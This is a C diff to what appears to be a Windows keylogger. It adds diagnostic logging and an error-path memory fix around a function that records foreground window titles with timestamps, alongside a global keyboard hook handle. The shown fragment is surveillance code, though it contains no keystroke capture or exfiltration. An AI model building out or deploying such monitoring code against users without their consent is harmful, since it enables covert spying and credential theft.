@@ -3,6 +3,14 @@
 HHOOK hKeyboardHook = NULL;
 HKL currentKBLayout = NULL;
 
+void	write_logs(char *str)
+{
+	if (logFile == NULL)
+		return ;
+	DWORD bytesWritten;
+	WriteFile(logFile, str, (DWORD)strlen(str), &bytesWritten, NULL);
+}
+
 void	write_to_file(char *str)
 {
 	if (fd == NULL)
@@ -39,7 +47,10 @@ void get_foreground_window(HWND hwnd)
 {
 	wchar_t windowTitleW[256];
 	if (GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)) == 0)
+	{
+		write_logs("Failed to get foreground window title, can be caused by an alt tab.\n");
 		return;
+	}
 
 	int i = 0;
 	while (windowTitleW[i] != '\0' && i < 256 - 1)
@@ -54,12 +65,19 @@ void get_foreground_window(HWND hwnd)
 	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
 	char *windowTitleUtf8 = (char *)malloc(utf8Len);
 	if (!windowTitleUtf8)
+	{
+		write_logs("Failed to allocate memory for window title UTF-8 conversion.\n");
 		return;
+	}
 	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);
 
 	char *dateStr = GetDateFormated();
 	if (dateStr == NULL)
+	{
+		free(windowTitleUtf8);
+		write_logs("Failed to get date for foreground window log.\n");
 		return;
+	}
 
 	char logEntry[1024];
 	snprintf(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: '%s'\n", dateStr, windowTitleUtf8);
